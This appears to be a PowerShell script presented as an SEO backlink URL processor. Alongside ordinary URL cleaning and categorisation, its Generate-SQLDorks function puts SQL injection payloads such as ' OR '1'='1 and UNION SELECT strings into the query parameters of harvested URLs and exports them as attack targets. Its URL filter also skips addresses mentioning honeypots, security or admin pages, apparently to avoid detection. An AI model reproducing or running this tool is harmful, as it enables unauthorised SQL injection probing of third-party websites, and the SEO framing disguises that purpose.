# SEO Backlink URL Processor - PowerShell Automation
# Educational purposes only - Use responsibly

param(
    [string]$InputFile = "",
    [string]$OutputDir = ".\processed_urls",
    [switch]$CleanDuplicates,
    [switch]$ExtractKeywords,
    [switch]$AddPrefixSuffix,
    [string]$Prefix = "",
    [string]$Suffix = "",
    [switch]$Categorize,
    [switch]$GenerateDorks
)

# Create output directory
if (!(Test-Path $OutputDir)) {
    New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
    Write-Host "Created output directory: $OutputDir" -ForegroundColor Green
}

function Write-Banner {
    Write-Host @"
╔══════════════════════════════════════════════════════════════════╗
║                    SEO URL Processor v1.0                       ║
║                  Educational Use Only                            ║
╚══════════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Cyan
}

function Clean-URLs {
    param([string[]]$urls)
    
    Write-Host "Cleaning URLs..." -ForegroundColor Yellow
    
    $cleaned = $urls | Where-Object { 
        $_ -and 
        $_ -match '^https?://' -and 
        $_.Length -lt 2000 -and
        $_ -notmatch '(honeypot|security|test|admin|phpmyadmin)'
    }
    
    # Remove duplicates
    $cleaned = $cleaned | Sort-Object -Unique
    
    Write-Host "Cleaned URLs: $($cleaned.Count) valid URLs" -ForegroundColor Green
    return $cleaned
}

function Extract-Keywords {
    param([string[]]$urls)
    
    Write-Host "Extracting keywords from URLs..." -ForegroundColor Yellow
    
    $keywords = @()
    
    foreach ($url in $urls) {
        # Extract domain
        if ($url -match 'https?://([^/]+)') {
            $domain = $matches[1]
        }
        
        # Extract path keywords
        if ($url -match 'https?://[^/]+/(.+)') {
            $path = $matches[1]
            $pathKeywords = $path -split '[/\-_\.]' | Where-Object { $_.Length -gt 2 }
        }
        
        # Extract parameters
        if ($url -match '\?(.+)') {
            $params = $matches[1] -split '&' | ForEach-Object { 
                if ($_ -match '([^=]+)=') { $matches[1] }
            }
        }
        
        $urlData = [PSCustomObject]@{
            URL = $url
            Domain = $domain
            PathKeywords = ($pathKeywords -join ', ')
            Parameters = ($params -join ', ')
        }
        
        $keywords += $urlData
    }
    
    return $keywords
}

function Add-PrefixSuffix {
    param(
        [string[]]$urls,
        [string]$prefix,
        [string]$suffix
    )
    
    Write-Host "Adding prefix/suffix to URLs..." -ForegroundColor Yellow
    
    $processed = $urls | ForEach-Object {
        "$prefix$_$suffix"
    }
    
    return $processed
}

function Categorize-URLs {
    param([string[]]$urls)
    
    Write-Host "Categorizing URLs..." -ForegroundColor Yellow
    
    $categories = @{
        'Education' = @()
        'E-commerce' = @()
        'Content' = @()
        'Services' = @()
        'Other' = @()
    }
    
    foreach ($url in $urls) {
        switch -Regex ($url) {
            '(edu|school|college|university|course|class|workshop|tutorial|learn)' {
                $categories['Education'] += $url
                break
            }
            '(shop|store|product|cart|buy|order|price|catalog)' {
                $categories['E-commerce'] += $url
                break
            }
            '(blog|article|news|content|post|page|cms)' {
                $categories['Content'] += $url
                break
            }
            '(service|business|company|professional|contact)' {
                $categories['Services'] += $url
                break
            }
            default {
                $categories['Other'] += $url
            }
        }
    }
    
    return $categories
}

function Generate-SQLDorks {
    param([string[]]$urls)
    
    Write-Host "Generating SQL injection dorks..." -ForegroundColor Yellow
    
    $dorks = @()
    
    # Common SQL injection patterns
    $injectionPatterns = @(
        "' OR '1'='1",
        "' UNION SELECT 1,2,3--",
        "' AND 1=1--",
        "' OR 1=1 LIMIT 1--",
        "' UNION ALL SELECT NULL,NULL,NULL--"
    )
    
    foreach ($url in $urls) {
        if ($url -match '\?(.+)') {
            $baseUrl = $url -replace '\?.*$', ''
            $params = $matches[1] -split '&'
            
            foreach ($param in $params) {
                if ($param -match '([^=]+)=(.*)') {
                    $paramName = $matches[1]
                    $paramValue = $matches[2]
                    
                    foreach ($pattern in $injectionPatterns) {
                        $dork = "$baseUrl?$paramName=$pattern"
                        $dorks += $dork
                    }
                }
            }
        }
    }
    
    return $dorks | Select-Object -Unique
}

function Export-Results {
    param(
        [hashtable]$results,
        [string]$outputDir
    )
    
    Write-Host "Exporting results..." -ForegroundColor Yellow
    
    foreach ($key in $results.Keys) {
        $filename = "$outputDir\$($key.ToLower() -replace ' ', '_').txt"
        $results[$key] | Out-File -FilePath $filename -Encoding UTF8
        Write-Host "Exported: $filename ($($results[$key].Count) items)" -ForegroundColor Green
    }
}

# Main execution
Write-Banner

if (-not $InputFile -or -not (Test-Path $InputFile)) {
    Write-Host "Error: Please provide a valid input file with -InputFile parameter" -ForegroundColor Red
    Write-Host "Usage: .\url_processor.ps1 -InputFile 'urls.txt' -CleanDuplicates -ExtractKeywords -Categorize" -ForegroundColor White
    exit 1
}

# Read input URLs
Write-Host "Reading URLs from: $InputFile" -ForegroundColor Cyan
$rawUrls = Get-Content $InputFile -Encoding UTF8

Write-Host "Loaded $($rawUrls.Count) raw URLs" -ForegroundColor White

$results = @{}

# Process URLs based on parameters
if ($CleanDuplicates -or -not $PSBoundParameters.ContainsKey('CleanDuplicates')) {
    $cleanUrls = Clean-URLs -urls $rawUrls
    $results['cleaned_urls'] = $cleanUrls
}

if ($ExtractKeywords) {
    $keywords = Extract-Keywords -urls $cleanUrls
    $results['url_keywords'] = $keywords | ConvertTo-Csv -NoTypeInformation
}

if ($AddPrefixSuffix -and ($Prefix -or $Suffix)) {
    $prefixedUrls = Add-PrefixSuffix -urls $cleanUrls -prefix $Prefix -suffix $Suffix
    $results['prefixed_urls'] = $prefixedUrls
}

if ($Categorize) {
    $categories = Categorize-URLs -urls $cleanUrls
    foreach ($category in $categories.Keys) {
        if ($categories[$category].Count -gt 0) {
            $results["category_$category"] = $categories[$category]
        }
    }
}

if ($GenerateDorks) {
    $dorks = Generate-SQLDorks -urls $cleanUrls
    $results['sql_dorks'] = $dorks
}

# Export all results
Export-Results -results $results -outputDir $OutputDir

Write-Host "`nProcessing complete! Check the output directory: $OutputDir" -ForegroundColor Green
Write-Host "Total files created: $($results.Keys.Count)" -ForegroundColor White